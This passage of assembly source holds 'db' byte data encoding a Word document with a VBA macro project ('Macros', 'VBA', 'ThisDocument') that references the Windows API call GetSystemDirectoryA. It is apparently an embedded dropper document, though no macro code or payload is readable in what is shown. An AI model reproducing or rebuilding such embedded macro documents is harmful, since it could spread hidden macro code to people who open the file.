    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 001h, 000h, 000h, 000h, 002h, 000h, 000h, 000h, 003h, 000h, 000h, 000h
    db 004h, 000h, 000h, 000h, 005h, 000h, 000h, 000h, 006h, 000h, 000h, 000h
    db 007h, 000h, 000h, 000h, 0feh, 0ffh, 0ffh, 0ffh, 009h, 000h, 000h, 000h
    db 00ah, 000h, 000h, 000h, 00bh, 000h, 000h, 000h, 00ch, 000h, 000h, 000h
    db 00dh, 000h, 000h, 000h, 00eh, 000h, 000h, 000h, 00fh, 000h, 000h, 000h
    db 0feh, 0ffh, 0ffh, 0ffh, 011h, 000h, 000h, 000h, 012h, 000h, 000h, 000h
    db 013h, 000h, 000h, 000h, 014h, 000h, 000h, 000h, 015h, 000h, 000h, 000h
    db 016h, 000h, 000h, 000h, 017h, 000h, 000h, 000h, 0feh, 0ffh, 0ffh, 0ffh
    db 019h, 000h, 000h, 000h, 01ah, 000h, 000h, 000h, 01bh, 000h, 000h, 000h
    db 01ch, 000h, 000h, 000h, 01dh, 000h, 000h, 000h, 01eh, 000h, 000h, 000h
    db 01fh, 000h, 000h, 000h, 0feh, 0ffh, 0ffh, 0ffh, 0fdh, 0ffh, 0ffh, 0ffh
    db 022h, 000h, 000h, 000h, 029h, 000h, 000h, 000h, 0feh, 0ffh, 0ffh, 0ffh
    db 025h, 000h, 000h, 000h, 026h, 000h, 000h, 000h, 027h, 000h, 000h, 000h
    db 028h, 000h, 000h, 000h, 02ah, 000h, 000h, 000h, 031h, 000h, 000h, 000h
    db 02bh, 000h, 000h, 000h, 02ch, 000h, 000h, 000h, 02dh, 000h, 000h, 000h
    db 02eh, 000h, 000h, 000h, 02fh, 000h, 000h, 000h, 030h, 000h, 000h, 000h
    db 0feh, 0ffh, 0ffh, 0ffh, 0feh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 052h, 000h, 06fh, 000h
    db 06fh, 000h, 074h, 000h, 020h, 000h, 045h, 000h, 06eh, 000h, 074h, 000h
    db 072h, 000h, 079h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 016h, 000h, 005h, 001h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 003h, 000h, 000h, 000h, 006h, 009h, 002h, 000h, 000h, 000h, 000h, 000h
    db 0c0h, 000h, 000h, 000h, 000h, 000h, 000h, 046h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 020h, 043h, 067h, 0afh
    db 065h, 0b4h, 0bfh, 001h, 024h, 000h, 000h, 000h, 0c0h, 017h, 000h, 000h
    db 000h, 000h, 000h, 000h, 031h, 000h, 054h, 000h, 061h, 000h, 062h, 000h
    db 06ch, 000h, 065h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 00eh, 000h, 002h, 001h
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 008h, 000h, 000h, 000h, 000h, 010h, 000h, 000h, 000h, 000h, 000h, 000h
    db 057h, 000h, 06fh, 000h, 072h, 000h, 064h, 000h, 044h, 000h, 06fh, 000h
    db 063h, 000h, 075h, 000h, 06dh, 000h, 065h, 000h, 06eh, 000h, 074h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 01ah, 000h, 002h, 001h, 005h, 000h, 000h, 000h
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 010h, 000h, 000h, 000h, 000h, 000h, 000h, 005h, 000h, 053h, 000h
    db 075h, 000h, 06dh, 000h, 06dh, 000h, 061h, 000h, 072h, 000h, 079h, 000h
    db 049h, 000h, 06eh, 000h, 066h, 000h, 06fh, 000h, 072h, 000h, 06dh, 000h
    db 061h, 000h, 074h, 000h, 069h, 000h, 06fh, 000h, 06eh, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 028h, 000h, 002h, 001h, 002h, 000h, 000h, 000h, 004h, 000h, 000h, 000h
    db 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 010h, 000h, 000h, 000h, 000h, 010h, 000h, 000h
    db 000h, 000h, 000h, 000h, 005h, 000h, 044h, 000h, 06fh, 000h, 063h, 000h
    db 075h, 000h, 06dh, 000h, 065h, 000h, 06eh, 000h, 074h, 000h, 053h, 000h
    db 075h, 000h, 06dh, 000h, 06dh, 000h, 061h, 000h, 072h, 000h, 079h, 000h
    db 049h, 000h, 06eh, 000h, 066h, 000h, 06fh, 000h, 072h, 000h, 06dh, 000h
    db 061h, 000h, 074h, 000h, 069h, 000h, 06fh, 000h, 06eh, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 038h, 000h, 002h, 001h
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 018h, 000h, 000h, 000h, 000h, 010h, 000h, 000h, 000h, 000h, 000h, 000h
    db 04dh, 000h, 061h, 000h, 063h, 000h, 072h, 000h, 06fh, 000h, 073h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 00eh, 000h, 001h, 000h, 001h, 000h, 000h, 000h
    db 00ch, 000h, 000h, 000h, 00bh, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 010h, 048h, 036h, 0afh, 065h, 0b4h, 0bfh, 001h
    db 040h, 0afh, 062h, 0afh, 065h, 0b4h, 0bfh, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 056h, 000h, 042h, 000h
    db 041h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 008h, 000h, 001h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 007h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 010h, 048h, 036h, 0afh, 065h, 0b4h, 0bfh, 001h, 040h, 07ah, 056h, 0afh
    db 065h, 0b4h, 0bfh, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 054h, 000h, 068h, 000h, 069h, 000h, 073h, 000h
    db 044h, 000h, 06fh, 000h, 063h, 000h, 075h, 000h, 06dh, 000h, 065h, 000h
    db 06eh, 000h, 074h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 01ah, 000h, 002h, 001h
    db 009h, 000h, 000h, 000h, 008h, 000h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 0a8h, 009h, 000h, 000h, 000h, 000h, 000h, 000h
    db 001h, 000h, 000h, 000h, 002h, 000h, 000h, 000h, 003h, 000h, 000h, 000h
    db 004h, 000h, 000h, 000h, 005h, 000h, 000h, 000h, 006h, 000h, 000h, 000h
    db 007h, 000h, 000h, 000h, 008h, 000h, 000h, 000h, 009h, 000h, 000h, 000h
    db 00ah, 000h, 000h, 000h, 00bh, 000h, 000h, 000h, 00ch, 000h, 000h, 000h
    db 00dh, 000h, 000h, 000h, 00eh, 000h, 000h, 000h, 00fh, 000h, 000h, 000h
    db 010h, 000h, 000h, 000h, 011h, 000h, 000h, 000h, 012h, 000h, 000h, 000h
    db 013h, 000h, 000h, 000h, 014h, 000h, 000h, 000h, 015h, 000h, 000h, 000h
    db 016h, 000h, 000h, 000h, 017h, 000h, 000h, 000h, 018h, 000h, 000h, 000h
    db 019h, 000h, 000h, 000h, 01ah, 000h, 000h, 000h, 01bh, 000h, 000h, 000h
    db 01ch, 000h, 000h, 000h, 01dh, 000h, 000h, 000h, 01eh, 000h, 000h, 000h
    db 01fh, 000h, 000h, 000h, 020h, 000h, 000h, 000h, 021h, 000h, 000h, 000h
    db 022h, 000h, 000h, 000h, 023h, 000h, 000h, 000h, 024h, 000h, 000h, 000h
    db 025h, 000h, 000h, 000h, 026h, 000h, 000h, 000h, 0feh, 0ffh, 0ffh, 0ffh
    db 028h, 000h, 000h, 000h, 029h, 000h, 000h, 000h, 02ah, 000h, 000h, 000h
    db 02bh, 000h, 000h, 000h, 02ch, 000h, 000h, 000h, 02dh, 000h, 000h, 000h
    db 02eh, 000h, 000h, 000h, 02fh, 000h, 000h, 000h, 030h, 000h, 000h, 000h
    db 031h, 000h, 000h, 000h, 032h, 000h, 000h, 000h, 033h, 000h, 000h, 000h
    db 034h, 000h, 000h, 000h, 035h, 000h, 000h, 000h, 036h, 000h, 000h, 000h
    db 037h, 000h, 000h, 000h, 038h, 000h, 000h, 000h, 039h, 000h, 000h, 000h
    db 03ah, 000h, 000h, 000h, 03bh, 000h, 000h, 000h, 03ch, 000h, 000h, 000h
    db 03dh, 000h, 000h, 000h, 03eh, 000h, 000h, 000h, 03fh, 000h, 000h, 000h
    db 040h, 000h, 000h, 000h, 041h, 000h, 000h, 000h, 042h, 000h, 000h, 000h
    db 043h, 000h, 000h, 000h, 044h, 000h, 000h, 000h, 045h, 000h, 000h, 000h
    db 046h, 000h, 000h, 000h, 047h, 000h, 000h, 000h, 048h, 000h, 000h, 000h
    db 049h, 000h, 000h, 000h, 04ah, 000h, 000h, 000h, 04bh, 000h, 000h, 000h
    db 04ch, 000h, 000h, 000h, 04dh, 000h, 000h, 000h, 0feh, 0ffh, 0ffh, 0ffh
    db 04fh, 000h, 000h, 000h, 050h, 000h, 000h, 000h, 051h, 000h, 000h, 000h
    db 052h, 000h, 000h, 000h, 053h, 000h, 000h, 000h, 054h, 000h, 000h, 000h
    db 055h, 000h, 000h, 000h, 0feh, 0ffh, 0ffh, 0ffh, 0feh, 0ffh, 0ffh, 0ffh
    db 058h, 000h, 000h, 000h, 059h, 000h, 000h, 000h, 05ah, 000h, 000h, 000h
    db 05bh, 000h, 000h, 000h, 05ch, 000h, 000h, 000h, 0feh, 0ffh, 0ffh, 0ffh
    db 05eh, 000h, 000h, 000h, 0feh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 001h, 016h, 001h, 000h
    db 001h, 018h, 001h, 000h, 000h, 0ech, 003h, 000h, 000h, 0fch, 000h, 000h
    db 000h, 028h, 002h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 0f3h, 003h, 000h
    db 000h, 0dbh, 006h, 000h, 000h, 000h, 000h, 000h, 000h, 001h, 000h, 000h
    db 000h, 03bh, 077h, 09fh, 08ah, 000h, 000h, 0ffh, 0ffh, 023h, 001h, 000h
    db 000h, 088h, 000h, 000h, 000h, 0b6h, 000h, 0ffh, 0ffh, 001h, 001h, 028h
    db 000h, 000h, 000h, 000h, 000h, 020h, 002h, 014h, 000h, 000h, 000h, 0ffh
    db 0ffh, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 047h
    db 065h, 074h, 053h, 079h, 073h, 074h, 065h, 06dh, 044h, 069h, 072h, 065h
    db 063h, 074h, 06fh, 072h, 079h, 041h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 001h
    db 000h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 010h, 000h, 000h, 000h, 003h, 000h, 000h, 000h, 005h
    db 000h, 000h, 000h, 007h, 000h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 001h, 001h, 008h, 000h, 000h, 000h, 0ffh, 0ffh, 0ffh
    db 0ffh, 078h, 000h, 000h, 000h, 008h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 0ffh, 0ffh, 000h, 000h, 000h, 000h, 04dh, 045h, 000h, 000h
    db 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 000h, 000h, 0ffh, 0ffh
    db 000h, 000h, 000h, 000h, 0ffh, 0ffh, 001h, 001h, 000h, 000h, 000h, 000h
    db 0dfh, 000h, 0ffh, 0ffh, 000h, 000h, 000h, 000h, 00ch, 000h, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 028h, 000h, 000h, 000h, 002h, 000h
    db 053h, 04ch, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 001h, 000h, 053h, 010h
    db 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 001h, 000h, 053h, 094h, 0ffh, 0ffh
    db 0ffh, 0ffh, 000h, 000h, 000h, 000h, 002h, 03ch, 0ffh, 0ffh, 0ffh, 0ffh
    db 000h, 000h, 0ffh, 0ffh, 001h, 001h, 000h, 000h, 000h, 000h, 001h, 000h
    db 04eh, 000h, 030h, 000h, 07bh, 000h, 030h, 000h, 030h, 000h, 030h, 000h
    db 032h, 000h, 030h, 000h, 039h, 000h, 030h, 000h, 036h, 000h, 02dh, 000h
    db 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 02dh, 000h, 030h, 000h
    db 030h, 000h, 030h, 000h, 030h, 000h, 02dh, 000h, 043h, 000h, 030h, 000h
    db 030h, 000h, 030h, 000h, 02dh, 000h, 030h, 000h, 030h, 000h, 030h, 000h
    db 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h
    db 030h, 000h, 034h, 000h, 036h, 000h, 07dh, 000h, 006h, 000h, 000h, 000h
    db 0ffh, 0ffh, 0ffh, 0ffh, 001h, 001h, 038h, 001h, 000h, 000h, 002h, 080h
    db 0feh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 010h, 000h, 0ffh, 0ffh, 028h, 000h
    db 000h, 000h, 002h, 001h, 0ffh, 0ffh, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h
    db 000h, 000h, 01dh, 000h, 000h, 000h, 025h, 000h, 000h, 000h, 02bh, 012h
    db 01ah, 002h, 0b0h, 000h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h
    db 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h
    db 000h, 000h, 070h, 000h, 000h, 000h, 003h, 000h, 0ffh, 0ffh, 000h, 000h
    db 0ffh, 0ffh, 001h, 000h, 001h, 000h, 000h, 000h, 00ch, 002h, 000h, 000h
    db 000h, 000h, 069h, 083h, 01ch, 002h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 008h, 000h, 0ffh, 0ffh, 000h, 000h, 000h, 000h, 090h, 000h
    db 000h, 000h, 084h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 069h, 083h
    db 01eh, 002h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 003h, 000h
    db 0ffh, 0ffh, 000h, 000h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 084h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 00ch, 011h, 022h, 002h, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 000h, 000h, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 000h, 000h, 0ffh, 0ffh
